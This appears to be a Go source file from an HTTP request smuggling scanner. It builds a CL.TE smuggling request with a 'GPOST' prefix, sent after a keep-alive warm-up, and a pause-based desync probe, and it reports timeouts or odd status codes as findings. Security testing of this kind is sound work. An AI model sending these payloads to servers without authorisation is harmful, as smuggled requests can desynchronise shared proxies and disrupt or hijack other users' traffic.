package scan

// connstate.go — Connection state manipulation / pause-based desync
//
// Maps to ConnectionStateScan.java and PauseDesyncScan.java.
//
// Strategy A (connection state): Send a well-formed first request over a keep-alive
// connection; some servers (e.g. HAProxy) switch parsing state after the first
// request and may parse the second differently — allowing desync via the second req.
//
// Strategy B (pause desync): Send partial request data, pause, then send the rest.
// Some servers flush buffers mid-stream and can be confused by the timing gap.

import (
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/smuggled/smuggled/pkg/report"
	"github.com/smuggled/smuggled/pkg/transport"
)

// ScanConnectionState tests for connection-state-based desync.
func ScanConnectionState(target *url.URL, base []byte, cfg Config, rep *report.Reporter) {
	rep.Log("ConnectionState probe: %s", target.Host)

	host := target.Hostname()
	if p := target.Port(); p != "" {
		host = host + ":" + p
	}
	path := target.RequestURI()
	if path == "" {
		path = "/"
	}

	// First request: completely normal GET (establishes connection + switches state)
	warmup := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", path, host)

	// Second request on same connection: CL.TE smuggling attempt
	smugglePath := path
	smuggledPrefix := "GPOST " + smugglePath + " HTTP/1.1\r\nFoo: x"
	chunkBody := fmt.Sprintf("0\r\n\r\n%s", smuggledPrefix)

	var attack strings.Builder
	attack.WriteString("POST " + path + " HTTP/1.1\r\n")
	attack.WriteString("Host: " + host + "\r\n")
	attack.WriteString("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n")
	attack.WriteString("Content-Type: application/x-www-form-urlencoded\r\n")
	attack.WriteString("Transfer-Encoding: chunked\r\n")
	attack.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(chunkBody)))
	attack.WriteString("Connection: keep-alive\r\n")
	attack.WriteString("\r\n")
	attack.WriteString(chunkBody)

	attackBytes := []byte(attack.String())

	conn, err := transport.Dial(target, cfg.Timeout, cfg.Proxy, cfg.SkipTLSVerify)
	if err != nil {
		rep.Log("ConnectionState: dial error: %v", err)
		return
	}
	defer conn.Close()

	// Send warm-up
	if err := conn.Send([]byte(warmup)); err != nil {
		return
	}
	r1, _, t1 := conn.RecvWithTimeout(cfg.Timeout)
	if t1 || len(r1) == 0 {
		return
	}
	if containsStr(r1, "connection: close") {
		rep.Log("ConnectionState: server closed after warmup")
		return
	}

	// Send CL.TE attack on same connection
	if err := conn.Send(attackBytes); err != nil {
		return
	}
	r2, elapsed, t2 := conn.RecvWithTimeout(cfg.Timeout)

	if t2 {
		rep.Emit(report.Finding{
			Target:      target.String(),
			Severity:    report.SeverityProbable,
			Type:        "connection-state",
			Technique:   "warmup-CLTE",
			Description: "Second request on keep-alive connection timed out — possible connection-state desync",
			Evidence:    fmt.Sprintf("elapsed=%v warmup_status=%d", elapsed, statusCode(r1)),
			RawProbe:    truncate(warmup+"\n---attack---\n"+attack.String(), 768),
		})
	} else if len(r2) > 0 && isSuspiciousResponse(r2) {
		rep.Emit(report.Finding{
			Target:      target.String(),
			Severity:    report.SeverityProbable,
			Type:        "connection-state",
			Technique:   "warmup-CLTE-status",
			Description: fmt.Sprintf("Suspicious status %d on second request suggests connection-state desync", statusCode(r2)),
			Evidence:    fmt.Sprintf("elapsed=%v r2_status=%d", elapsed, statusCode(r2)),
		})
	}
}

// ScanPauseDesync tests for pause-based desync (mid-request TCP pause).
func ScanPauseDesync(target *url.URL, base []byte, cfg Config, rep *report.Reporter) {
	rep.Log("PauseDesync probe: %s", target.Host)

	host := target.Hostname()
	if p := target.Port(); p != "" {
		host = host + ":" + p
	}
	path := target.RequestURI()
	if path == "" {
		path = "/"
	}

	// Split the request into two parts: headers and body.
	// Send headers, pause, then send the body.
	// If a front-end proxy processes the request after only seeing the headers
	// (treating it as complete because of a timeout/flush), the body is parsed
	// by the back-end as a new request.

	headers := fmt.Sprintf(
		"POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nConnection: keep-alive\r\n\r\n",
		path, host)
	body := "x=y&z="

	pauseDuration := 6 * time.Second
	if cfg.Timeout < pauseDuration {
		return // need at least 6s timeout to run this probe
	}

	conn, err := transport.Dial(target, cfg.Timeout, cfg.Proxy, cfg.SkipTLSVerify)
	if err != nil {
		rep.Log("PauseDesync: dial error: %v", err)
		return
	}
	defer conn.Close()

	// Send only headers
	if err := conn.Send([]byte(headers)); err != nil {
		return
	}

	// Pause
	time.Sleep(pauseDuration)

	// Read anything that arrived during the pause
	earlyResp, earlyElapsed, earlyTimeout := conn.RecvWithTimeout(500 * time.Millisecond)

	if len(earlyResp) > 0 && !earlyTimeout {
		// Server responded before we sent the body — it forwarded an incomplete request
		rep.Emit(report.Finding{
			Target:      target.String(),
			Severity:    report.SeverityProbable,
			Type:        "pause-desync",
			Technique:   "header-pause",
			Description: fmt.Sprintf("Server responded (status=%d) after %.1fs pause before body was sent — possible pause desync", statusCode(earlyResp), earlyElapsed.Seconds()),
			Evidence:    fmt.Sprintf("early_status=%d elapsed=%v", statusCode(earlyResp), earlyElapsed),
			RawProbe:    truncate(headers+body, 512),
		})
		return
	}

	// Send body
	conn.Send([]byte(body)) //nolint:errcheck
}
